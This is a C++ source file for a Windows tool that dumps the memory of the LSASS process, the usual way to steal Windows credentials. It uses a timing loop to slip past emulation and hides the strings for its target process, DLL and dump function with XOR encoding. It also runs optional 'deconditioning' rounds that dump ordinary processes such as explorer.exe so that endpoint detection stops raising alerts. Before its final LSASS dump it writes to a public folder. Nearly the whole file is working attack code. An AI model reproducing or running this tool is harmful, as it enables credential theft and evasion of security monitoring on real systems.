#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <chrono>
#include <iostream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "dbghelp.lib")

typedef BOOL(WINAPI* MyDumpPtr)(
    HANDLE        hProcess,
    DWORD         ProcessId,
    HANDLE        hFile,
    MINIDUMP_TYPE DumpType,
    PVOID         ExceptionParam,
    PVOID         UserStreamParam,
    PVOID         CallbackParam
    );

int main(int argc, char** argv) {
    int deconDumps = 0;
    if (argc >= 2) {
        deconDumps = atoi(argv[1]);
    }

    std::cout << "Reader started with PID=" << GetCurrentProcessId() << ", doing " << deconDumps << " deconditioning rounds\n";

    // antiEmulation should be one of the first actions in the EXE
    std::cout << "Doing anti emulation calc operations for about 5 sec\n";

    auto start_ae_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
    auto end_ae_calc = std::chrono::high_resolution_clock::now();
    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();

    std::cout << "Calculated for approximately " << ae_calc_elapsed << " ms\n";

    std::cout << "Before creating proc snapshot\n";

    // create a snapshot of running procs
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp failed\n";
        return 1;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    std::cout << "After creating proc snapshot\n";

    // init strings
    std::cout << "Before decrypting strings\n";

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
    BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x35,0x27,0x32,0x36,0x6f,0x26,0x2c,0x32,0x41 };
    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
    BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
    BYTE dumpFunctionBytes[] = { 0x0c,0x2b,0x2f,0x2b,0x05,0x37,0x2c,0x32,0x16,0x30,0x28,0x36,0x24,0x06,0x34,0x2f,0x31,0x42 };
    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    std::cout << "After decrypting strings\n";

    char* outFile = reinterpret_cast<char*>(outFileBytes);
    char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
    char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);

    std::cout << "Before opening out file\n";

    // open handle to dump file (overwrite if exists)
    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open out file: " << GetLastError();
        return 1;
    }
    std::cout << "After opening out file handle\n";

    std::cout << "Before resolving function\n";

    // resolving functions
    HMODULE hLib = LoadLibraryA(dumpLibrary);
    if (!hLib) {
        std::cerr << "Failed to load lib " << dumpLibrary << ": " << GetLastError();
        CloseHandle(hFile);
        return 1;
    }
    MyDumpPtr MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
    if (!MiniDWriteD) {
        std::cerr << "Failed to get function addr " << dumpFunction << ": " << GetLastError();
        CloseHandle(hFile);
        return 1;
    }

    std::cout << "After resolving function\n";

    if (deconDumps > 0) {
        std::cout << "Starting deconditioning\n";
    }

    std::vector<std::wstring> procsDump = {
        L"explorer.exe", L"powershell.exe", L"cmd.exe", L"ShellHost.exe", L"audiodg.exe"
    };
    int i = 0;
    while (i < deconDumps) { // repeat until target number reached
        int prev = i;
        if (Process32First(snap, &pe)) {
            do {
                // only dump "non important" procs, do not raise alerts here
                if (std::find(procsDump.begin(), procsDump.end(), pe.szExeFile) != procsDump.end()) {

                    HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                    if (hDecon == NULL) {
                        continue; // ignore errors, just open+dump as many procs as possible (except lsass)
                    }
                    std::cout << "Dumping " << pe.th32ProcessID << "\n";

                    // blindly dump and overwrite
                    MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
                    // and close proc handle again
                    CloseHandle(hDecon);
                    i++;
                }
            } while (Process32Next(snap, &pe) && i < deconDumps);
        }
        if (i == prev) {
            std::cout << "Unable to dump any proc\n";
            break; // unable to dump any proc, break
        }
    }

    if (deconDumps > 0) {
        std::cout << "Finished deconditioning, dumped " << i << " procs\n";
    }

    // init strings
    std::cout << "Before decrypting target proc string\n";

    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    std::cout << "After decrypting target proc string\n";
    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);

    // find lsass's PID (but do not interact with it yet!)
    std::cout << "Before finding pid\n";

    if (Process32First(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procW) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    if (pid != 0) {
        std::cout << "After finding pid: " << pid << "\n";
    }
    else {
        std::cerr << "Unable to find pid\n";
        CloseHandle(hFile);
        return 1;
    }

    std::cout << "Before opening process handle\n";

    // open process with all access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process: " << GetLastError();
        CloseHandle(hFile);
        return 1;
    }

    std::cout << "After opening process handle\n";

    std::cout << "Before creating dump\n";

    // create mini dump of proc
    if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        std::cerr << "Failed to create dump: " << GetLastError() << "\n";
    }
    else {
        std::cout << "After creating dump\n";
    }

    CloseHandle(hProcess);
    CloseHandle(hFile);
}
